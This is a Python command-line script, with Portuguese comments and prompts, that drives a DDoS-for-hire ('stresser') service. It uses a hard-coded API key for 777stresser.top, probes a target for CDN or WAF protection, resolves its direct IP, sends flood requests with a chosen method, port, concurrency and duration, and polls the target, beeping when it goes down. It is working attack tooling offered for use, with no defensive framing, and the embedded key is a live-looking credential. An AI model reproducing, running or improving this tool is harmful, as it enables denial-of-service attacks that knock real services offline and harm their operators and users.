#!/usr/bin/env python3
import requests
import os
import time
import sys
import socket
from requests.packages.urllib3.exceptions import InsecureRequestWarning

# Silenciar avisos de SSL
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)

# CORES ANSI
R = "\033[91m"  # Vermelho Vibrante
B = "\033[1m"   # Negrito
E = "\033[0m"   # Reset

# DADOS DE AUTENTICAÇÃO
KEY = "sk_44c34e74e6e805741ed375c9545c32f17f100e0c465aae0a335cdd5a4aa45c73"
API = "https://777stresser.top/api/customer-request"

def get_protection(host):
    """Verifica proteção WAF/CDN e resolve o IP Direto"""
    target = host.replace("http://", "").replace("https://", "").split('/')[0]
    try:
        ip = socket.gethostbyname(target)
    except:
        ip = "Desconhecido"
    
    try:
        url = f"http://{target}"
        headers = {'User-Agent': 'Mozilla/5.0'}
        r = requests.get(url, timeout=5, verify=False, headers=headers)
        server = r.headers.get('Server', '').lower()
        
        # Lógica de Detecção
        headers_str = str(r.headers).lower()
        if "cloudflare" in server or "cf-ray" in headers_str: return "CLOUDFLARE", ip
        if "cloudfront" in headers_str or "amazon" in server: return "AWS SHIELD", ip
        if "fortinet" in headers_str or "fortisg" in server: return "FORTINET", ip
        if "hostdime" in server: return "HOSTDIME", ip
        if "vercel" in server or "vercel" in headers_str: return "VERCEL", ip
        if "netlify" in server: return "NETLIFY", ip
        if "akamai" in headers_str: return "AKAMAI", ip
        if "sucuri" in headers_str: return "SUCURI", ip
        if "ddos-guard" in server: return "DDOS-GUARD", ip
        if "imperva" in headers_str or "incapsula" in headers_str: return "IMPERVA", ip
        if "nginx" in server: return "NGINX (DIRETO?)", ip
        
        return "DIRETO", ip
    except:
        return "DESCONHECIDO/OFFLINE", ip

def beep():
    """Emite um sinal sonoro no terminal"""
    sys.stdout.write('\a')
    sys.stdout.flush()

def check_status(host, port):
    """Verifica se o alvo está online ou offline"""
    target = host.replace("http://", "").replace("https://", "").split('/')[0]
    try:
        if port in ["80", "443", "8080", "8443"]:
            url = f"http://{target}:{port}" if port != "443" else f"https://{target}"
            headers = {'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/120.0.0.0 Safari/537.36'}
            r = requests.get(url, timeout=3, verify=False, headers=headers, allow_redirects=True)
            if r.status_code >= 500 or any(x in r.text for x in ["502 Bad Gateway", "503 Service", "Cloudflare Error"]):
                return "DOWN"
            return "UP"
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.settimeout(2.0)
            s.connect((target, int(port)))
            s.close()
            return "UP"
    except:
        return "DOWN"

def draw_banner():
    """Desenha o banner inicial"""
    banner = f"""{R}{B}
      ::::::::  :::::::::  ::::::::: 
     :+:    :+:       :+:        :+: 
          +:+        +:+        +:+  
        +#+        +#+        +#+    
      +#+        +#+        +#+      
     #+#        #+#        #+#       
    ###        ###        ###        {E}"""
    os.system('clear' if os.name == 'posix' else 'cls')
    print(banner)
    print(f"{R}" + "—"*45 + f"{E}")

def main():
    draw_banner()
    
    h = input(f"{R}[>] ALVO (URL/IP): {E}")
    
    # Passo de Reconhecimento
    print(f"{R}[*] ESCANEANDO PROTEÇÃO...{E}")
    prot, ip = get_protection(h)
    print(f"{R}[+] PROTEÇÃO: {B}{prot}{E}")
    print(f"{R}[+] IP RESOLVIDO: {B}{ip}{E}")
    print(f"{R}" + "—"*45 + f"{E}")
    
    p = input(f"{R}[>] PORTA: {E}")
    t = input(f"{R}[>] TEMPO (s): {E}")
    m = input(f"{R}[>] MÉTODO: {E}").upper()
    c = input(f"{R}[>] CONCORRÊNCIA: {E}")
    r = int(input(f"{R}[>] REPETIÇÕES: {E}"))

    params = {"method": m, "host": h, "port": p, "conc": c, "time": t, "auth-key": KEY}

    for i in range(r):
        print(f"\n{R}{B}[*] EXECUTANDO {m} | CICLO {i+1}/{r}{E}")
        try:
            res = requests.get(API, params=params)
            print(f"{R}[+]{E} RESPOSTA_API: {res.text[:60]}")
            
            last_st = ""
            for sec in range(int(t) + 1):
                st = check_status(h, p)
                if st == "DOWN" and last_st != "DOWN":
                    beep()
                last_st = st
                pct = int((sec / int(t)) * 100)
                fill = int(sec / int(t) * 20)
                bar = '█' * fill + '·' * (20 - fill)
                sys.stdout.write(f'\r{R}[{bar}{R}] {pct}% | {sec}s | STATUS: {st} {E}')
                sys.stdout.flush()
                if sec < int(t): time.sleep(1)
            print()
        except Exception as e:
            print(f"\n{R}[X] ERRO NA EXECUÇÃO: {e}{E}")
            break
    print(f"\n{R}[-] OPERAÇÃO CONCLUÍDA.{E}")

if __name__ == "__main__":
    main()
